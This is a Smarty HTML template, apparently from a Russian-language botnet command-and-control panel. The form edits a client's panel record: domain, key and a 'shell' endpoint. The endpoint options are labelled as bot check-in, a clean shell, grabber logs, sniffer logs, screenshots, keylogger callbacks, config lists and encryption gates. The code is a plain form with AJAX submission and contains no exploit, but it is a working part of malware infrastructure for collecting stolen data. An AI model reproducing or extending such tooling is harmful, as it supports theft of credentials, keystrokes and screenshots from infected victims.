{if $registration_end ne true}
<form action="/admins/edit-{$admin->id}.html?window=1" enctype="application/x-www-form-urlencoded" method="post" name="edit_sub{$rand_name}" id="edit_sub{$rand_name}" onsubmit="submit_{$rand_name}(); return false;">
  <h2 align="center">Изменение админки</h2>
  {if $account_errors ne ""}
  <div align="center">{$account_errors}</div><br />
  {/if}
  <table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
    <tr class="bgp2">
      <th style="text-align: left; width: 200px;">Клиент</th>
      <th style="text-align: left;">{$admin->name}</th>
    </tr>
    <tr class="bgp2">
      <th style="text-align: left; width: 200px;">Текущий домен админки</th>
      <th style="text-align: left;">{$admin->link}</th>
    </tr>
    <tr class="bgp2">
      <th style="text-align: left; width: 200px;">Текущий ключ админки</th>
      <th style="text-align: left;">{$admin->keyid}</th>
    </tr>
    <tr class="bgp2">
      <th style="text-align: left; width: 200px;">Текущий шелл админки</th>
      <th style="text-align: left;">{$admin->shell}</th>
    </tr>
    <tr class="bgp2">
      <th colspan="2">&nbsp;</th>
    </tr>
    <tr class="bgp2">
      <th style="text-align: left;">Клиент</th>
      <th style="text-align: left;"><input name="name" type="text" value="{$smarty.post.name}" class="user" style="width:100%" /></th>
    </tr>
    <tr class="bgp2">
      <th style="text-align: left;">Новый домен админки</th>
      <th style="text-align: left;"><input name="link" type="text" value="{$smarty.post.link}" class="user" style="width:100%" /></th>
    </tr>
    <tr class="bgp2">
      <th style="text-align: left;">Новый ключ админки</th>
      <th style="text-align: left;"><input name="key" type="text" value="{$smarty.post.key}" class="user" style="width:100%" /></th>
    </tr>
    <tr class="bgp2">
      <th style="text-align: left;">Новый шелл админки</th>
      <th style="text-align: left;">
      <select name="shell" style="width:100%" class="user">
      <option value="/set/task.html"{if $smarty.post.shell eq '/set/task.html'} selected="selected"{/if}>/set/task.html - Отстук бота</option>
      <option value="/index.php"{if $smarty.post.shell eq '/index.php'} selected="selected"{/if}>/index.php - Главный файл админки</option>
      <option value="/set/cmd.html"{if $smarty.post.shell eq '/set/cmd.html'} selected="selected"{/if}>/set/cmd.html - Чистый шелл</option>
      <option value="/get/cab.html"{if $smarty.post.shell eq '/get/cab.html'} selected="selected"{/if}>/get/cab.html - Отстук на каб файлы</option>
      <option value="/get/cab_part.html"{if $smarty.post.shell eq '/get/cab_part.html'} selected="selected"{/if}>/get/cab_part.html - Отстук на пакетный каб файлы</option>
      <option value="/get/gra.html"{if $smarty.post.shell eq '/get/gra.html'} selected="selected"{/if}>/get/gra.html - Граббер логи</option>
      <option value="/get/scr.html"{if $smarty.post.shell eq '/get/scr.html'} selected="selected"{/if}>/get/scr.html - Скрины</option>
      <option value="/get/sni.html"{if $smarty.post.shell eq '/get/sni.html'} selected="selected"{/if}>/get/sni.html - Снифер логи</option>
      <option value="/123456.rar"{if $smarty.post.shell eq '/123456.rar'} selected="selected"{/if}>/123456.rar - Гейт шифрования №1</option>
      <option value="/get/key.html"{if $smarty.post.shell eq '/get/key.html'} selected="selected"{/if}>/get/key.html - Отстук на кейлогер</option>
      <option value="/set/cfgs.html"{if $smarty.post.shell eq '/set/cfgs.html'} selected="selected"{/if}>/set/cfgs.html - Отстук на конфиг лист</option>
      <option value="/123456.7z"{if $smarty.post.shell eq '/123456.7z'} selected="selected"{/if}>/123456.7z - Гейт шифрования №1</option>
      </select>
      </th>
    </tr>
    <tr class="bgp1">
      <th colspan="2"><input name="submit" type="button" value="Изменить" class="user" onclick="submit_{$rand_name}();" /></th>
    </tr>
  </table>
</form>
{else}
<script language="javascript" type="application/javascript">
get_hax({ldelim}url: '/admins/index.html?ajax=1'{rdelim});
</script>
<br />
<h2 align="center">Админка изменина!</h2>
<hr />
{/if}

<script language="javascript" type="application/javascript">
var id_{$rand_name} = document.forms['edit_sub{$rand_name}'].parentNode.id.replace('_content', '');
document.getElementById(id_{$rand_name} + '_title').innerHTML = 'Добавления админки';

function submit_{$rand_name}(){ldelim}
hax(document.forms['edit_sub{$rand_name}'].action,
	{ldelim}
		method: document.forms['edit_sub{$rand_name}'].method,
		form: 'edit_sub{$rand_name}',
		id: id_{$rand_name} + '_content',
		nohistory:true,
		nocache:true,
		destroy:true,
		rc:true
	{rdelim}
)
document.getElementById(id_{$rand_name} + '_content').innerHTML = '<br /><div align="center"><img src="/images/indicator.gif" title="Загрузка" alt="Загрузка" /></div>';
{rdelim};
</script> 